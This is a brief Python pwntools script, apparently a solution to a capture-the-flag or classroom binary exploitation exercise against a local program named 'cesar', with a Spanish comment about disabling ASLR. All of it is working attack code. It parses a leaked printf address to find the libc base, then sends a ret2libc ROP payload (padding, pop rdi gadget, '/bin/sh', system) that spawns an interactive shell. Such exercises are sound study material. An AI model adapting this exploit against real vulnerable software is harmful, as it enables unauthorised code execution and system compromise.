#!/usr/bin/python3

# No olvidar quitar ASLR

from pwn import *

size = 56

context.binary = './cesar'
io = process([context.binary.path, 'debug'])
libc = ELF('/lib/libc.so.6')

def exploit(io, libc):
    io.sendline(payload(libc))
    io.sendline("13")

def payload(libc):
    rop = ROP(context.binary)
    pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
    sh = next(libc.search(b'/bin/sh'))
    system = p64(libc.symbols['system'])
    return flat(size * 'a',
                pop_rdi,
                sh,
                system,
                endianness="little", word_size=64)

line = str(io.recvline())
line = line.replace('\\n\'', "")
parts = line.split(' ')

printf_a = int(parts[-1], 16)

libc.address = printf_a - libc.symbols['printf']
exploit(io, libc)

io.interactive()
